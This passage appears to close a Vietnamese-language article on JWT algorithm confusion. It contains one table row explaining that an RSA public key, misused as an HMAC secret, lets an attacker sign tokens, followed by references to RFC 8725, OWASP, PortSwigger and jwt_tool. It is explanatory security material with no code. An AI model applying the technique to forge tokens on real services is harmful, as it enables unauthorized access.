| 3 | **Public key an toàn trong RSA, nguy hiểm trong HMAC** | Biết public key = vô hại (RSA). Nhưng nếu bị ép sang HMAC, public key = shared secret = kẻ tấn công ký được |

---

## Tài liệu tham khảo

- [RFC 8725 — JWT Best Current Practices](https://datatracker.ietf.org/doc/html/rfc8725)
- [Tim McLean — Critical vulnerabilities in JSON Web Token libraries (2015)](https://auth0.com/blog/critical-vulnerabilities-in-json-web-token-libraries/)
- [PortSwigger — JWT Algorithm Confusion](https://portswigger.net/web-security/jwt/algorithm-confusion)
- [OWASP — JSON Web Token Cheat Sheet](https://cheatsheetseries.owasp.org/cheatsheets/JSON_Web_Token_for_Java_Cheat_Sheet.html)
- [jwt_tool — Testing JWT vulnerabilities](https://github.com/ticarpi/jwt_tool)
